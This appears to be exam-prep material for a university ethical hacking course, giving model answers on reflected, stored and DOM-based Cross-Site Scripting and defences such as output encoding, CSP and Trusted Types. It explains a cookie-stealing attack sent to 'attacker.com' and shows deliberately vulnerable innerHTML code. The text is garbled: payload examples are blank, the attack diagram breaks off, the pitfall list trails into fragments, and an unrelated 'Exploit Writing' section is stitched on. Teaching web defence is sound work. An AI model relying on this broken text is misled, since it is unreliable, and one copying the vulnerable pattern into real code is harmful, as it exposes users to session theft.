## 5.1 Part A Questions (3 Marks Each) ### Question 1: Define Cross-Site Scripting (XSS). Mention its significance in web application security. `[KTU University Exam - Dec 2023, Model Question Paper]` **Model Answer:** Cross-Site Scripting (XSS) is a **client-side code injection vulnerability** in which an attacker injects malicious scripts (typically JavaScript) into the content of a trusted website. When an unsuspecting user loads the compromised page, the injected script executes in the user's browser within the **security context of the legitimate website's origin**, thereby bypassing the Same-Origin Policy. **Significance in Web Application Security:** - Listed under **OWASP Top 10 (A03:2021 – Injection)**. - Allows **session hijacking, credential theft, defacement, phishing, and malware distribution**. - Categorized as **CWE-79**. - Has caused real-world incidents such as the **2005 Samy MySpace worm** and numerous data breaches. - Affects the **confidentiality, integrity, and availability** of web applications. ### Question 2: Differentiate between Reflected XSS and Stored XSS with examples. `[KTU University Exam - June 2024, Supplementary Exam]` **Model Answer:** | Feature | Reflected XSS | Stored XSS | |---------|---------------|------------| | **Persistence** | Non-persistent (one-time delivery) | Persistent (saved in database/file) | | **Delivery Mechanism** | Crafted URL sent via phishing | Posted directly to vulnerable application | | **Number of Victims** | One per click | All visitors of affected page | | **Server-Side Flaw Location** | Input parameter reflected in response | Input stored and later rendered without sanitization | | **Social Engineering** | Required | Not required for each victim | | **Severity** | Medium (CVSS ~6.1) | High (CVSS ~8.8) | | **Example URL** | `site.com/search?q=` | Comment field: `` stored and broadcast | --- ## 5.2 Part B Questions (14 Marks Each) — Module Internal Choice ### Question A (Choice 1) — 14 Marks `[KTU University Exam - Dec 2023, Main Exam]` #### Part (a) — 7 Marks **Q: Explain the three main types of Cross-Site Scripting (XSS) attacks in detail with suitable diagrams and examples.** **Model Solution:** **Type 1: Reflected XSS (Non-Persistent)** - The malicious script is embedded in an HTTP request (URL parameter, form field) and is reflected back in the server's HTTP response without sanitization. - Execution occurs when the victim clicks a specially crafted link. - Example: `https://site.com/search?q=` — the `q` parameter is echoed into the response HTML. - Defense: Output encoding, input validation, CSP. **Type 2: Stored XSS (Persistent)** - The malicious script is permanently stored on the target server (database, file system, comment field) and is served to every user who views the affected content. - The 2005 Samy MySpace worm exploited this to infect over one million profiles in 20 hours. - Example: A comment containing `` in a blog post affects all future readers. - Defense: Strict input validation, output encoding, sanitization libraries like DOMPurify. **Type 3: DOM-Based XSS** - The vulnerability lies in the **client-side JavaScript code**, not the server's response. The server's HTML is unchanged; the script dynamically writes untrusted data into the DOM. - Example vulnerable code: `document.write("Welcome " + location.hash.substring(1));` - Exploited via: `https://site.com/welcome#` - Defense: Avoid unsafe DOM APIs (`innerHTML`, `document.write`), use `textContent`, deploy Trusted Types. #### Part (b) — 7 Marks **Q: Describe the impact of XSS attacks. List and explain five defensive measures to prevent XSS.** **Model Solution:** **Impact of XSS Attacks:** 1. **Session Hijacking:** Theft of session cookies enables account takeover. 2. **Credential Theft:** Keylogging scripts capture login credentials. 3. **Defacement:** Malicious scripts alter the visual appearance of trusted sites. 4. **Phishing:** Redirects users to fake login pages. 5. **Malware Distribution:** Injected scripts download ransomware or trojans onto victim systems. 6. **Data Exfiltration:** Sensitive personal and financial data is transmitted to attacker servers. **Defensive Measures:** 1. **Input Validation (Whitelist Approach):** Reject all input that does not match an expected pattern (e.g., alphanumeric only). Apply on both client and server sides. 2. **Output Encoding (Context-Sensitive):** Encode data based on the context where it will be placed: - HTML context: Use `<`, `>`, `&`, `"` - JavaScript context: Use `\xHH` or `\uHHHH` Unicode escapes - URL context: Use percent-encoding `%HH` 3. **Content Security Policy (CSP):** Deploy the `Content-Security-Policy` HTTP header to whitelist trusted script sources: ``` Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com ``` 4. **HttpOnly and Secure Cookie Flags:** Mark session cookies as `HttpOnly` (inaccessible to JavaScript) and `Secure` (transmitted only over HTTPS): ``` Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict ``` 5. **Use of Sanitization Libraries:** Employ well-tested libraries such as **DOMPurify, OWASP Java Encoder, or Bleach** to clean HTML input. 6. **Trusted Types API (Modern Defense):** Enforce that only sanitized, policy-approved values can be passed to dangerous DOM sinks. --- ### Question B (Choice 2) — 14 Marks `[KTU University Exam - June 2024, Main Exam]` #### Part (a) — 7 Marks **Q: With a neat diagram, explain the working of a Reflected Cross-Site Scripting attack. Demonstrate the attack with a suitable example payload.** **Model Solution:** **Working of Reflected XSS Attack (with diagram):** The following flow represents a typical reflected XSS attack: ``` [Attacker] --> Crafts malicious URL with payload in parameter | v [Sends to Victim via Email/Phishing] | v [Victim Clicks the Link] | v [Browser sends request to vulnerable-site.com/search?q=] | v [Server reflects 'q' parameter value into response HTML without sanitization] | v [Browser receives HTML containing the injected ``` When the victim clicks, the script in the `q` parameter is reflected in the response: ```html You searched for: ``` The browser executes the script, sending the session cookie to `attacker.com`. The attacker uses the stolen cookie to impersonate the victim. #### Part (b) — 7 Marks **Q: Explain DOM-based XSS. How does it differ from reflected and stored XSS? Provide a defensive code example.** **Model Solution:** **DOM-Based XSS Explained:** DOM-based XSS is a variant where the vulnerability lies entirely in the **client-side JavaScript code** that processes data from untrusted sources (URL fragments, `location.search`, `document.referrer`) and writes them into dangerous DOM sinks (`innerHTML`, `document.write`, `eval`) without sanitization. **Vulnerable Code Example:** ```javascript // Vulnerable client-side script var userInput = location.hash.substring(1); document.getElementById("greeting").innerHTML = "Hello, " + userInput; ``` **Exploitation:** Victim is tricked into clicking: `https://vulnerable.com/page#` The browser parses the URL, extracts the hash, and the JavaScript writes it into the DOM via `innerHTML`, executing the injected `onerror` handler. **Key Differences from Reflected and Stored XSS:** | Dimension | DOM-Based | Reflected | Stored | |-----------|-----------|-----------|--------| | **Vulnerable Code Location** | Client-side JavaScript | Server-side response builder | Server-side response builder | | **Server-Side Detection** | Impossible (request looks normal) | Possible (payload in request) | Possible (payload in stored data) | | **Payload Location** | URL fragment (`#`) or client-side variable | URL parameter (`?`) | Database / file system | | **Common Sink** | `innerHTML`, `document.write` | HTML response body | HTML response body | | **Defense** | Avoid unsafe DOM APIs, Trusted Types | Output encoding, CSP | Input sanitization + output encoding | **Defensive Code Example (Safe Alternative):** ```javascript // Safe client-side code var userInput = location.hash.substring(1); // Use textContent to avoid HTML interpretation document.getElementById("greeting").textContent = "Hello, " + userInput; // Or with Trusted Types policy if (window.trustedTypes && trustedTypes.createPolicy) { const policy = trustedTypes.createPolicy('safe', { createHTML: (input) => DOMPurify.sanitize(input) }); document.getElementById("greeting").innerHTML = policy.createHTML(userInput); } ``` --- ## 5.3 KTU Examiner's Valuation Warning / Pitfall Callout > [!WARNING] > **Common Mark-Deduction Pitfalls in KTU Exams:** > 1. **Confusing XSS with CSRF:** Many students mix up Cross-Site Scripting with Cross-Site Request Forgery. Remember: **XSS = code injection (script runs in victim's browser); CSRF = unauthorized action submission (no script injection, exploits existing session).** > 2. **Forgetting Output Encoding context:** Marks are lost when students only mention "escape input" without specifying **HTML, JavaScript, URL, and CSS contexts**. > 3. **Skipping diagrams in 14-mark answers:** KTU evaluators explicitly look for flow diagrams in long-answer questions. A missing diagram typically costs **1–2 marks**. > 4. **Not providing payloads:** Generic definitions without concrete `` (basic test) - `` (filter bypass) - `

topics.title: Exploit Writing
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY > - **Module:** Module Module 2 > - **Topic:** Exploit Writing # SECTION 1: Core Technical Definition & Intuitive Overview ## 1.1 Formal Academic Definition > [!IMPORTANT] > **Exploit Writing** is the systematic process of identifying, developing, and weaponizing a piece of code (an *exploit*) that takes advantage of a **software vulnerability, hardware flaw, or configuration weakness** to cause unintended, malicious, or unauthorized behavior in a computing system, network, or embedded/IoT device.
